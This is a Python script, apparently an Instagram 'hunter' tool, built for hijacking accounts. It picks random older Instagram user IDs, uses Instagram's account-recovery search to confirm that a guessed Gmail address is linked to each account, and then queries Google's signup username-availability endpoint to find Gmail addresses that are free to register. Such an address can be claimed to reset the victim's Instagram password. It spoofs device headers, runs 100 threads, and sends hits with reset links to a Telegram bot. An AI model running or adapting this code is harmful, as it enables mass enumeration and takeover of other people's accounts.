import requests
import uuid
import time
import random
import json
import string
import re
import os
import sys
import base64
import secrets
from datetime import datetime
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
# from cfonts import render

email = None
hits = 0
good = 0
taken = 0
bad = 0
limit = 0
info = {}
session = requests.session()
_session = requests.session()


reset     = "\033[0m"
bold      = "\033[1m"
dim       = "\033[2m"
italic    = "\033[3m"


fg_lavender = "\033[38;5;183m"   # لافندر ناعم
fg_mint     = "\033[38;5;121m"   # نعناعي
fg_blue     = "\033[38;5;75m"    # أزرق سماوي
fg_red      = "\033[38;5;196m"   # أحمر ساطع
fg_pink     = "\033[38;5;213m"   # وردي
fg_cyan     = "\033[38;5;51m"    # سيان
fg_yellow   = "\033[38;5;226m"   # أصفر
fg_orange   = "\033[38;5;208m"   # برتقالي
fg_white    = "\033[38;5;255m"   # أبيض ساطع
fg_green    = "\033[38;5;82m"    # أخضر ساطع
fg_gold     = "\033[38;5;220m"   # ذهبي
fg_purple   = "\033[38;5;141m"   # أرجواني فاتح


bg_lavender = "\033[48;5;183m"
bg_mint     = "\033[48;5;121m"
bg_blue     = "\033[48;5;75m"
bg_red      = "\033[48;5;196m"
bg_pink     = "\033[48;5;213m"
bg_purple   = "\033[48;5;141m"
bg_dark     = "\033[48;5;235m"
bg_dark2    = "\033[48;5;236m"


import time
import sys
import os

id_ = os.environ.get("INSTA_HUNTER_TELEGRAM_OWNER_ID")
if not id_:
    if sys.stdin.isatty():
        id_ = input(f"{fg_lavender}{bold}✤ أدخل معرف التيليجرام (ID)➤ {reset}")
        print('')
    else:
        id_ = ""

token = os.environ.get("INSTA_HUNTER_TELEGRAM_TOKEN")
if not token:
    if sys.stdin.isatty():
        token = input(f"{fg_mint}{bold}✤ أدخل توكن البوت ➤ (TOKEN) {reset}")
        print('')
    else:
        token = ""


animation = [
    "⏳ جاري التحميل...",
    "⏳ الرجاء الانتظار...",
    "⏳ يتم التحقق...",
    "⏳ تم الاستلام...",
]

for frame in animation:
    sys.stdout.write(f"\r{fg_gold}{bold}{frame}{reset}")
    sys.stdout.flush()
    time.sleep(0.8)

print("\n")

os.system('cls' if os.name == 'nt' else 'clear')


print(f"{fg_red}{bold}✈منورين اداة حمودي الحموي بالعافية عليكم الصيد{reset}")



def display():
    stats = (
        f"\r"
        f"{fg_gold}{bold}╭━━━〔 ✦ 𝐋𝐈𝐕𝐄 𝐒𝐓𝐀𝐓𝐒 ✦ 〕━━━╮{reset}\n"

        f"{fg_lavender}{bold}┃ ✦ 𝐇𝐈𝐓𝐒        ➤ {reset}{fg_white}ہٹس : {hits}{reset}\n"
        f"{fg_mint}{bold}┃ ✦ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒     ➤ {reset}{fg_white}کامیاب : {good}{reset}\n"
        f"{fg_red}{bold}┃ ✦ 𝐅𝐀𝐈𝐋𝐄𝐃      ➤ {reset}{fg_white}فیل : {bad}{reset}\n"
        f"{fg_blue}{bold}┃ ✦ 𝐓𝐀𝐊𝐄𝐍       ➤ {reset}{fg_white}لیا گیا : {taken}{reset}\n"
        f"{fg_gold}{bold}┃ ✦ 𝐄𝐌𝐀𝐈𝐋𝐒       ➤ {reset}{fg_white}ای میلز : {email}{reset}\n"

        f"{fg_gold}{bold}╰━━━〔 ✦  𝐏𝐀𝐍𝐄𝐋 ✦ 〕━━━╯{reset}"
        f"{' ' * 10}"
    )
    sys.stdout.write(stats)
    sys.stdout.flush()


def get_tl():
    while True:
        try:
            url = "https://accounts.google.com/_/signup/validatepersonaldetails"
            params = {
                'hl': "en-GB",
                '_reqid': "46000",
                'rt': "j"
            }
            payload = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': '["AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl",null,null,null,null,0,0,"aesowns","aesowns",null,0,null,1,[],1]',
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
                'gmscoreversion': "null",
                'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301",
                'checkedDomains': "youtube",
                'pstMsg': "1",
                '': ""
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'x-same-domain': "1",
                'google-accounts-xsrf': "1",
                'sec-ch-ua-mobile': "?1",
                'sec-ch-ua-platform': '"Android"',
                'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
                'origin': "https://accounts.google.com",
                'x-client-data': "CP/xygE=",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
            }
            response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
            tl_1 = json.loads(response.text[5:])[0][1][2]

            url = "https://accounts.google.com/_/signup/validatebasicinfo"
            params = {
                'hl': "en-GB",
                'TL': tl_1,
                '_reqid': "346000",
                'rt': "j"
            }
            payload = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': '["TL:' + tl_1 + '",2015,4,15,2,null,null,0,null,null,0,0]',
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
                'gmscoreversion': "null",
                'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301",
                'checkedDomains': "youtube",
                'pstMsg': "1",
                '': ""
            }
            headers['referer'] = "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl_1

            response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
            tl = json.loads(response.text[5:])[0][0][4].split("TL:")[1]
            with open("google.txt", "w") as w:
                w.write(tl)
            time.sleep(300)
        except Exception:
            time.sleep(15)

Thread(target=get_tl, daemon=True).start()


def lookup(email):
    global bad, good
    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    device = str(uuid.uuid4())
    family = str(uuid.uuid4())
    android = "android-" + secrets.token_hex(8)
    payload = {
        'params': '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":' + str(int(time.time())) + ',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) + '\\"}","flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED","READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},"was_headers_prefill_available":0,"network_bssid":null,"sfdid":"","fetched_email_token_list":{},"search_query":"' + email + '","auth_secure_device_id":"","ig_oauth_token":[],"cloud_trust_token":null,"was_headers_prefill_used":0,"sso_accounts_auth_data":[],"encrypted_msisdn":"","device_network_info":null,"text_input_id":"akyuf0:61","zero_balance_state":null,"android_build_type":"release","accounts_list":[],"is_oauth_without_permission":0,"ig_android_qe_device_id":"' + device + '","gms_incoming_call_retriever_eligibility":"client_not_supported","search_screen_type":"email_or_username","is_whatsapp_installed":1,"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,"headers_infra_flow_id":"","fetched_email_list":[]},"server_params":{"event_request_id":"' + str(uuid.uuid4()) + '","is_from_logged_out":0,"layered_homepage_experiment_group":null,"device_id":"' + android + '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) + '","INTERNAL__latency_qpl_instance_id":6.3987980400102E13,"is_platform_login":0,"context_data":"","login_entry_point":"logged_out","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + family + '","offline_experiment_group":"caa_iteration_v3_perf_ig_4","access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0,"qe_device_id":"' + device + '"}}',
        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
    }
    headers = {
        'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
        'accept-language': "en-IN, en-US",
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': android,
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
    }
    response = requests.post(url, data=payload, headers=headers, timeout=20)
    if f"{email}" in response.text:
        good += 1
        display()
        check_gmail(email)
    elif 'Sorry, something' in response.text:
        limit += 1
        display()
    else:
        bad += 1
        display()


def check_gmail(email):
    global hits, taken
    usr = email.split("@")[0]
    if not os.path.exists("google.txt"):
        print("⚠️ Warning: google.txt is missing. Still waiting for Google token verification...")
        sys.stdout.flush()
        return

    try:
        with open("google.txt", "r") as ys:
            tl = ys.read().strip()
        if not tl:
            return
    except Exception:
        return

    url = "https://accounts.google.com/_/signup/usernameavailability"
    params = {
        'hl': "en-GB",
        'TL': tl,
        '_reqid': "446000",
        'rt': "j"
    }
    payload = {
        'continue': "https://accounts.google.com/ManageAccount?nc=1",
        'f.req': '["TL:' + tl + '","' + usr + '",0,0,1,null,1,2464]',
        'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
        'cookiesDisabled': "false",
        'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
        'gmscoreversion': "null",
        'flowName': "GlifWebSignIn",
        'checkConnection': "youtube:301",
        'checkedDomains': "youtube",
        'pstMsg': "1",
        '': ""
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'x-same-domain': "1",
        'google-accounts-xsrf': "1",
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
        'origin': "https://accounts.google.com",
        'x-client-data': "CP/xygE=",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl,
        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
    }
    response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
    if '"gf.uar",1' in response.text:
        hits += 1
        display()
        gmail = get_masked(usr)
        bot(token, id_, gmail, usr, email)
    else:
        taken += 1
        display()


def get_masked(query):
    url = "https://www.instagram.com/api/graphql"
    payload = {
        'av': "0",
        '__d': "www",
        '__user': "0",
        '__a': "1",
        '__req': "f",
        '__hs': "20563.HYP:instagram_web_pkg.2.1...0",
        'dpr': "3",
        '__ccg': "GOOD",
        '__rev': "1037676804",
        '__s': "nz2w5z:1vm2xs:94sap8",
        '__hsi': "7630740602831122681",
        '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
        '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
        '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
        '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
        '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
        '__comet_req': "7",
        'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
        'jazoest': "22394",
        '__spin_r': "1037676804",
        '__spin_b': "trunk",
        '__spin_t': "1776670246",
        '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
        'qpl_active_flow_ids': "516759801",
        'fb_api_caller_class': "RelayModern",
        'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
        'server_timestamps': "true",
        'variables': '{"params":{"event_request_id":"7ca5daae-5770-42dd-b77b-0cf23a865a7f","next_uri":"","search_query":"' + query + '","waterfall_id":"553aadae-3ec5-4031-8395-efbabcc670ce"}}',
        'doc_id': "26178667145161478",
        'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]'
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-model': '""',
        'x-ig-app-id': "936619743392459",
        'x-ig-max-touch-points': "5",
        'sec-ch-ua-mobile': "?0",
        'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
        'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
        'sec-ch-ua-platform-version': '""',
        'x-asbd-id': "359341",
        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
        'sec-ch-prefers-color-scheme': "dark",
        'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
        'sec-ch-ua-platform': '"Linux"',
        'origin': "https://www.instagram.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.instagram.com/accounts/password/reset/",
        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
    }
    response = requests.post(url, data=payload, headers=headers, timeout=20)
    try:
        email = next((i["contact_point"] for i in response.json()["data"]["caa_ar_ig_account_search"]["contact_points"] if i["type"] == "EMAIL"), None)
        if email:
            return email
        else:
            return None
    except Exception:
        return None


def bot(token, id_, gmail, usr, email):
    username = usr
    data = info.get(username, {})

    business = data.get('is_business', None)
    followers = data.get('follower_count', None)
    following = data.get('following_count', None)
    posts = data.get('media_count', None) or 0
    private = data.get('is_private', None)
    full_name = data.get('full_name', None)
    biography = data.get('biography', None)

    business = business if business is not None else 'None'
    followers = followers if followers is not None else 'None'
    following = following if following is not None else 'None'
    private = private if private is not None else 'None'
    full_name = full_name if full_name is not None else 'None'
    biography = biography if biography is not None else 'None'

    if gmail:
        mail = gmail
    else:
        mail = 'None'

    if posts > 2:
        meta_status = 'True'
    else:
        meta_status = 'False'

    total_hits = "hit"
    domain = email.split("@")[1] if email and "@" in email else "gmail.com"

    try:
        info_text = f'''

╭━━━〔 ✦ 𝐈𝐍𝐒𝐓𝐀 𝐑𝐄𝐏𝐎𝐑𝐓 ✦ 〕━━━╮
┃ ✦ Meta➤ {total_hits}
┃ ✦ Meta  ➤ {meta_status}
┃ ✦ یوزر     ➤ {username}
┃ ✦ ايميل     ➤ {username}@{domain}
┃ ✦ ريست   ➤ {rest(username)}
┃ ✦ الاسن {full_name}]
{followers} المتابعين
┃ ✦ متابع كم شخص {following}
┃ ✦ تاریخ         ➤ [2013-2020]
┃ ✦ بوست {posts}
┃ ✦ لنک           ➤ https://www.instagram.com/{username}
╰━━━〔 ✦ 𝐃𝐄𝐕 : @greatemperorrr ✦ 〕━━━╯

'''
        # Structured output for our panel web dashboard
        import sys
        print(f"__HIT__|{username}|{username}@{domain}|{followers}|{posts}|{rest(username)}|{full_name}")
        sys.stdout.flush()

        if os.environ.get("SEND_TELEGRAM", "true").lower() == "true" and token and id_:
            response = requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id_}&text={info_text}",
                timeout=20
            )

    except Exception:
        with open('hamodihits.txt', 'a') as a:
            a.write(f'{info_text}\n')


def get_tokens():
    while True:
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = session.get('https://www.instagram.com/', headers=headers, timeout=20)
            csrf = response.cookies.get('csrftoken', '')
            find = re.search(r'"LSD",\[\],{"token":"(.*?)"\}', response.text)
            lsd = find.group(1) if find else None
            with open("tokens.txt", "w") as fd:
                fd.write(f"{csrf}|{lsd}")
        except Exception:
            pass

Thread(target=get_tokens, daemon=True).start()


def load_tokens():
    try:
        with open('tokens.txt', 'r') as file:
            parts = file.read().strip().split("|")
            if len(parts) == 2:
                csrf, lsd = parts
                if csrf and lsd:
                    return csrf, lsd
    except Exception:
        pass
    return "bKPOnxXALzrHjjhgVUSXUWvsJSheI52L", "9CaKjXH_JGbfD4zZaTfZ8a"


def get_usernames():
    global email
    while True:
        try:
            # Pick a random ID range with corresponding year
            id_ranges = [
                (17750000, 900990000, 2012),
                (900990000, 2013),
                (900990001, 1629010000, 2014),
            ]
            selected_range = random.choice(id_ranges)
            
            if len(selected_range) == 3:
                min_id, max_id, year = selected_range
            else:
                min_id, max_id = selected_range
            
            rand_id = random.randint(min_id, max_id)
            
            csrf, lsd = load_tokens()
            cookies = {
                'rur': '"HIL\\\\0545636887483\\\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'x-ig-app-id': '936619743392459',
                'x-fb-lsd': lsd,
                'sec-ch-prefers-color-scheme': 'light',
                'x-csrftoken': csrf,
                'sec-ch-ua-platform': '"Android"',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin'
            }
            payload = {
                'lsd': lsd,
                'variables': json.dumps({"userID": rand_id, "username": "cristiano"}),
                'doc_id': '7717269488336001',
            }
            response = session.post('https://www.instagram.com/api/graphql', headers=headers, data=payload, cookies=cookies, timeout=20)
            username = response.json().get('data', {}).get('user', {}).get('username', {})
            followers = response.json().get('data', {}).get('user', {}).get('follower_count', {})
            pk_id = response.json().get('data', {}).get('user', {}).get('pk', {})
            if username and pk_id and followers:
                info[username] = response.json().get('data', {}).get('user', {})
                email = username + '@gmail.com'
                lookup(email)
        except Exception:
            pass


def rest(username):
    return f"https://www.instagram.com/accounts/password/reset/"


if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=100) as executor:
        for _ in range(400):
            executor.submit(get_usernames)